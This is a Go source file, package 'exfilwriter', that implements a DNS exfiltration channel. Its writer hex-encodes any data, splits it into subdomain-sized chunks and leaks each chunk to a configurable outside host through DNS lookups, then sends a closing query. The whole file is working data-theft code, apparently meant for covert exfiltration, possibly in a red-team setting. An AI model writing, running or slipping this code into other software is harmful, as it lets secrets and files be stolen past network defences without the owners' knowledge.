package exfilwriter

import (
	"encoding/hex"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"
)

const (
	dnsMessageIDLength = 6
	maxDomainLength    = 253
	maxSubDomainLength = 30
)

type dnsExfiltrator struct {
	host string
}

func newDNSExfiltrator(host string) *dnsExfiltrator {
	rand.Seed(time.Now().UnixNano())
	return &dnsExfiltrator{strings.Trim(host, " ")}
}

func (ex *dnsExfiltrator) Write(data []byte) (int, error) {
	payload := hex.EncodeToString(data)
	postfix := generateMessageID() + "." + ex.host

	// count 3 dots, not sure if necessary
	availableSpace := min(maxSubDomainLength, maxDomainLength-(len(postfix)+dnsMessageIDLength+3))

	for len(payload) > 0 {
		chunkLength := min(len(payload), availableSpace)
		_, _ = net.LookupHost(fmt.Sprintf("%s.%s", payload[:chunkLength], postfix))
		payload = payload[chunkLength:]
	}

	_, _ = net.LookupHost(fmt.Sprintf("close.%s", postfix))

	return len(data), nil
}

func min(a, b int) int {
	if a <= b {
		return a
	}

	return b
}

func generateMessageID() string {
	var charSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789")

	res := make([]rune, dnsMessageIDLength)
	for i := range res {
		res[i] = charSet[rand.Intn(len(charSet))] // nolint:gosec
	}

	return string(res)
}
